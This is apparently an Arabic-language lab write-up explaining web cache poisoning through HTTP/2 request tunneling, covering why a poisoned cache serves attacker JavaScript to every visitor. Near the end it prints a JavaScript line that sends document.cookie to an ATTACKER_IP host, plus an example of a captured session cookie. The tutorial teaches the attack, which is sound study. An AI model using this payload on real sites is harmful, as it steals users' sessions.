...
<details>
  <summary>HTTP/2 Request Tunneling: Web Cache Poisoning</summary>



أول حاجة... يعني إيه Web Cache؟
===============================

تخيل معايا فيه موظف استقبال في شركة.

أي حد يسأل:

> فين صفحة `/page1`؟

بدل ما كل مرة يروح يسأل الموظف اللي جوه (Backend)، بيحتفظ بنسخة عنده.
...
الـ Proxy يرد مباشرة

بدون ما يكلم الـ Backend.
...
يعني بدل 1000 Request

يبقى Backend يستقبل Request واحد فقط.

* * * * *

طب يعني إيه Cache Poisoning؟
============================

دي كلمة كبيرة بس معناها بسيط جدًا.

بدل ما الـ Cache يخزن
...
> Even if we can't influence users directly...

يعني

ممكن أنا مقدرش أهاجم كل User لوحده.

لكن لو هاجمت الـ Cache...

يبقى كل الناس هتتأثر مرة واحدة.

وده أخطر بكتير.

* * * * *

ليه الهجوم ده High Severity؟
============================
...
> the poisoned cached content can contain javascript payloads

يعني

بدل ما الكاش يخزن JavaScript الأصلية
...
ولما أي حد يدخل الموقع...

المتصفح هيشغل JavaScript بتاعتنا.
...
> attacker can't choose arbitrary content

يعني

مش أي حاجة نكتبها.

لازم المحتوى يكون موجود على الموقع أصلاً.
...
يبقى الملف بقى موجود على الموقع.
...
```
xhttp.open("GET",
"https://ATTACKER_IP:8002/?c="+document.cookie,
true);
```
...
```
https://attacker:8002/?c=session=abc123
```
...
<img width="1312" height="292" alt="image" src="https://github.com/user-attachments/assets/e9f27702-6bf3-4d7d-912d-0dbf5c9e0d4a" />
...
المتصفح بيمنع صفحة HTTPS من تحميل موارد غير مشفرة عبر HTTP حفاظًا على الأمان.
